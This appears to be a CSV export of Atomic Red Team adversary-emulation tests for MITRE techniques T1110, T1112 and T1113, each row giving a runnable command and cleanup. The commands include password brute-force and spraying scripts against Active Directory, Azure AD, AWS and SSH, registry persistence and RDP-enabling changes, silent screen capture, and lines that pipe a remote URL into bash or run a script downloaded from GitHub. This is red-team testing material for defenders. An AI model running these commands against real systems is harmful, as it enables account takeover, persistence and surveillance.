"File","AtomicTest","Command","Cleanup"
"C:\AtomicRedTeam\atomics\T1110.001\T1110.001.yaml","Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)","if (""#{auth}"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {
  Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported""
  exit 1
}

[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""#{domain}"",389)

$passwordList = Get-Content -Path ""#{passwords_path}""
foreach ($password in $passwordList){
  $credz = new-object System.Net.NetworkCredential(""#{user}"", $password, ""#{domain}"")
  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})
  try {
    Write-Host "" [-] Attempting ${password} on account #{user}.""
    $conn.bind()
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host "" [!] #{user}:${password} are valid credentials!""
  } catch {
    Write-Host $_.Exception.Message
  }
}
Write-Host ""End of bruteforce""
",
"C:\AtomicRedTeam\atomics\T1110.001\T1110.001.yaml","Brute Force Credentials of single Azure AD user","Import-Module -Name AzureAD

$passwords = ""#{passwords}"".split(""{`n}"")
foreach($password in $passwords) {
  $PWord = ConvertTo-SecureString -String ""$password"" -AsPlainText -Force
  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
  try {
    Write-Host "" [-] Attempting ${password} on account #{username}.""
    Connect-AzureAD -Credential $Credential 2>&1> $null
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host "" [!] #{username}:${password} are valid credentials!`r`n""
    break
  } catch {
    Write-Host "" [-] #{username}:${password} invalid credentials.`r`n""
  }
}
Write-Host ""End of bruteforce""
",
"C:\AtomicRedTeam\atomics\T1110.001\T1110.001.yaml","Password Brute User using Kerbrute Tool","cd ""PathToAtomicsFolder\..\ExternalPayloads""
.\kerbrute.exe bruteuser --dc #{domaincontroller} -d #{domain} $env:temp\bruteuser.txt TestUser1 
",
"C:\AtomicRedTeam\atomics\T1110.001\T1110.001.yaml","SUDO Brute Force - Debian","useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art
su -c ""cd /tmp; curl -s #{remote_url} | bash"" art
","userdel -fr art
"
"C:\AtomicRedTeam\atomics\T1110.001\T1110.001.yaml","SUDO Brute Force - Redhat","useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art
su art
cd /tmp
curl -s #{remote_url} |bash
","userdel -fr art
"
"C:\AtomicRedTeam\atomics\T1110.001\T1110.001.yaml","SUDO Brute Force - FreeBSD","pw adduser art -g wheel -s /bin/sh
echo ""password123"" | pw usermod art -h 0
su art
cd /tmp
curl -s #{remote_url} |bash
","rmuser -y art
"
"C:\AtomicRedTeam\atomics\T1110.001\T1110.001.yaml","ESXi - Brute Force Until Account Lockout","$lockout_threshold = [int]""#{lockout_threshold}""
for ($var = 1; $var -le $lockout_threshold; $var++) {
  #{plink_file} -ssh ""#{vm_host}"" -l root -pw f0b443ae-9565-11ee-b9d1-0242ac120002
  }
",
"C:\AtomicRedTeam\atomics\T1110.002\T1110.002.yaml","Password Cracking with Hashcat","cd #{hashcat_exe}\..
#{hashcat_exe} -a 0 -m 1000 -r .\rules\Incisive-leetspeak.rule #{input_file_sam} #{input_file_passwords}","del ""PathToAtomicsFolder\..\ExternalPayloads\hashcat6.7z"" >nul 2>&1
del ""PathToAtomicsFolder\..\ExternalPayloads\7z1900.exe"" >nul 2>&1
del ""PathToAtomicsFolder\..\ExternalPayloads\7z"" /Q /S >nul 2>&1
del ""PathToAtomicsFolder\..\ExternalPayloads\hashcat-unzip"" /Q /S >nul 2>&1"
"C:\AtomicRedTeam\atomics\T1110.003\T1110.003.yaml","Password Spray all Domain Users","@FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:""%userdomain%\%n"" ""#{password}"" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\IPC$ > NUL
",
"C:\AtomicRedTeam\atomics\T1110.003\T1110.003.yaml","Password Spray (DomainPasswordSpray)","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force
",
"C:\AtomicRedTeam\atomics\T1110.003\T1110.003.yaml","Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)","if (""#{auth}"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {
  Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported""
  exit 1
}

$DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server #{domain} | Select-Object -ExpandProperty SamAccountName

[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""#{domain}"",389)

$DomainUsers | Foreach-Object {
  $user = $_
  $password = '#{password}'

  $credz = new-object System.Net.NetworkCredential($user, $password, ""#{domain}"")
  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})
  try {
    Write-Host "" [-] Attempting ${password} on account ${user}.""
    $conn.bind()
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host "" [!] ${user}:${password} are valid credentials!""
  } catch {
    Write-Host $_.Exception.Message
  }
}
Write-Host ""End of password spraying""
",
"C:\AtomicRedTeam\atomics\T1110.003\T1110.003.yaml","Password spray all Azure AD users with a single password","Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String ""#{valid_password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{valid_username}"", $Pword
Connect-AzureAD -Credential $Credential > $null

($Users = Get-AzureADUser -All $true) > $null
Disconnect-AzureAD > $null
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force

$Users | Foreach-Object {
  $user = $_.UserPrincipalName
  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""$user"", $Pword
  try {
    Write-Host "" [-] Attempting #{password} on account ${user}.""
    Connect-AzureAD -Credential $Credential 2>&1> $null
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host "" [!] ${user}:#{password} are valid credentials!`r`n""
    Disconnect-AzureAD > $null
  } catch {
    Write-Host "" [-] ${user}:#{password} invalid credentials.`r`n""
  }
}
Write-Host ""End of password spraying""
",
"C:\AtomicRedTeam\atomics\T1110.003\T1110.003.yaml","Password Spray Invoke-DomainPasswordSpray Light","function Invoke-dpsLight ($Password, $userlist) {
$users = Get-Content $userlist
$Domain = ""LDAP://"" + ([ADSI]"""").distinguishedName
foreach ($User in $users) {
  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)
  if ($Domain_check.name -ne $null) {
    Write-Host -ForegroundColor Green ""Password found for User:$User Password:$Password""
  }
  else { Write-Host "". "" -NoNewline}
}
Write-Host -ForegroundColor green ""Finished""
}
Invoke-dpsLight ""#{password}"" $env:Temp\usersdpsLight.txt
",
"C:\AtomicRedTeam\atomics\T1110.003\T1110.003.yaml","Password Spray Microsoft Online Accounts with MSOLSpray (Azure/O365)","import-module ""PathToAtomicsFolder\..\ExternalPayloads\MSOLSpray.ps1""
Invoke-MSOLSpray -UserList ""#{user_list}"" -Password ""#{password}""
",
"C:\AtomicRedTeam\atomics\T1110.003\T1110.003.yaml","Password Spray using Kerbrute Tool","cd ""PathToAtomicsFolder\..\ExternalPayloads""
.\kerbrute.exe passwordspray --dc #{domaincontroller} -d #{domain} ""PathToAtomicsFolder\..\ExternalPayloads\passwordspray.txt"" password132 
",
"C:\AtomicRedTeam\atomics\T1110.003\T1110.003.yaml","AWS - Password Spray an AWS using GoAWSConsoleSpray","cd /tmp
git clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git
cd /tmp/GoAWSConsoleSpray
go run main.go GoAWSConsoleSpray -a #{aws_account_id} -u PathToAtomicsFolder/T1110.003/src/aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt
","rm -rf /tmp/GoAWSConsoleSpray
"
"C:\AtomicRedTeam\atomics\T1110.004\T1110.004.yaml","SSH Credential Stuffing From Linux","cp ""$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt"" /tmp/
for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d"":"" -f1`@#{target_host};done
",
"C:\AtomicRedTeam\atomics\T1110.004\T1110.004.yaml","SSH Credential Stuffing From MacOS","cp ""$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt"" /tmp/
for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d"":"" -f1`@#{target_host};done
",
"C:\AtomicRedTeam\atomics\T1110.004\T1110.004.yaml","SSH Credential Stuffing From FreeBSD","cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/
for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d"":"" -f1`@#{target_host};done
",
"C:\AtomicRedTeam\atomics\T1110.004\T1110.004.yaml","Brute Force:Credential Stuffing using Kerbrute Tool","cd ""PathToAtomicsFolder\..\ExternalPayloads""
.\kerbrute.exe bruteforce --dc #{domaincontroller} -d #{domain} ""PathToAtomicsFolder\..\ExternalPayloads\bruteforce.txt""      
",
"C:\AtomicRedTeam\atomics\T1112\T1112.yaml","Modify Registry of Local Machine - cmd","reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d #{new_executable} /f
","reg delete HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityHealth /f >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1112\T1112.yaml","Add domain to Trusted sites Zone","$key= ""HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\#{bad_domain}\""
$name =""bad-subdomain""
new-item $key -Name $name -Force
new-itemproperty $key$name -Name https -Value 2 -Type DWORD;
new-itemproperty $key$name -Name http  -Value 2 -Type DWORD;
new-itemproperty $key$name -Name *     -Value 2 -Type DWORD;
","$key = ""HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\#{bad_domain}\""
Remove-item  $key -Recurse -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1112\T1112.yaml","Change Powershell Execution Policy to Bypass","Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine
","try { Set-ExecutionPolicy -ExecutionPolicy #{default_execution_policy} -Scope LocalMachine -Force } catch {}
"
"C:\AtomicRedTeam\atomics\T1112\T1112.yaml","Event Viewer Registry Modification - Redirection URL","reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionURL /t REG_SZ /d ""#{redirection_url}"" /f","reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionURL /t REG_SZ /d ""http://go.microsoft.com/fwlink/events.asp"" /f"
"C:\AtomicRedTeam\atomics\T1112\T1112.yaml","Event Viewer Registry Modification - Redirection Program","reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d ""#{redirection_program}"" /f","reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /f"
"C:\AtomicRedTeam\atomics\T1112\T1112.yaml","Enable RDP via Registry (fDenyTSConnections)","reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f","if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /f >nul 2>&1)"
"C:\AtomicRedTeam\atomics\T1112\T1112.yaml","Setting Shadow key in Registry for RDP Shadowing","$s= New-CimSession -Computername #{server_name} -SessionOption (New-CimSessionOption -Protocol Dcom)
Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName=""Remote Desktop - Shadow (TCP-In)""' -CimSession $s | Invoke-CimMethod -MethodName Enable
Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=""Software\Policies\Microsoft\Windows NT\Terminal Services""; sValueName=""shadow""; uValue=[uint32]2} -CimSession $s","Invoke-CimMethod -ClassName StdRegProv -MethodName DeleteValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=""Software\Policies\Microsoft\Windows NT\Terminal Services""; sValueName=""Shadow""} -CimSession $s
"
"C:\AtomicRedTeam\atomics\T1112\T1112.yaml","Abusing Windows TelemetryController Registry Key for Persistence","reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\#{new_key}"" /t REG_SZ /v Command /d #{new_executable} /f
","reg delete ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\#{new_key}"" /f
"
"C:\AtomicRedTeam\atomics\T1112\T1112.yaml","Adding custom paths for application execution","reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\#{app_name}"" /t REG_SZ /d #{new_path} /f
","reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\#{app_name}"" /v (Default) /f
reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\#{app_name}"" /t REG_SZ /d ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" /f
"
"C:\AtomicRedTeam\atomics\T1113\T1113.yaml","Screencapture","screencapture #{output_file}
","rm #{output_file}
"
"C:\AtomicRedTeam\atomics\T1113\T1113.yaml","Screencapture (silent)","screencapture -x #{output_file}
","rm #{output_file}
"
"C:\AtomicRedTeam\atomics\T1113\T1113.yaml","X Windows Capture","xwd -root -out #{output_file}
xwud -in #{output_file}
","rm #{output_file}
"
"C:\AtomicRedTeam\atomics\T1113\T1113.yaml","X Windows Capture (freebsd)","xwd -root -out #{output_file}
xwud -in #{output_file}
","rm #{output_file}
"
"C:\AtomicRedTeam\atomics\T1113\T1113.yaml","Capture Linux Desktop using Import Tool","import -window root #{output_file}
","rm #{output_file}
"
"C:\AtomicRedTeam\atomics\T1113\T1113.yaml","Capture Linux Desktop using Import Tool (freebsd)","import -window root #{output_file}
","rm #{output_file}
"
"C:\AtomicRedTeam\atomics\T1113\T1113.yaml","Windows Screencapture","cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12
Add-Type -MemberDefinition '[DllImport(""user32.dll"")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;
[W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);
cmd /c ""timeout #{recording_time} > NULL && psr.exe /stop""
","rm #{output_file} -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1113\T1113.yaml","Windows Screen Capture (CopyFromScreen)","Add-Type -AssemblyName System.Windows.Forms
$screen = [Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
$graphic = [Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
$bitmap.Save(""#{output_file}"")
","Remove-Item #{output_file} -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1113\T1113.yaml","RDP Bitmap Cache Extraction via bmc-tools","$url = 'https://raw.githubusercontent.com/ANSSI-FR/bmc-tools/master/bmc-tools.py'
$toolsDir = ""$env:TEMP\bmc-tools.py""
 
# create output directory
New-Item -ItemType Directory -Path #{output_dir} -Force | Out-Null

# python script download
& curl.exe -L $url --output $toolsDir
 
# execution step
if (Test-Path $toolsDir) { python $toolsDir -s ""#{cache_path}"" -d #{output_dir} -b }
","Remove-Item ""$env:TEMP\bmc-tools.py"" -ErrorAction SilentlyContinue
Remove-Item #{output_dir} -Recurse -Force -ErrorAction SilentlyContinue
"
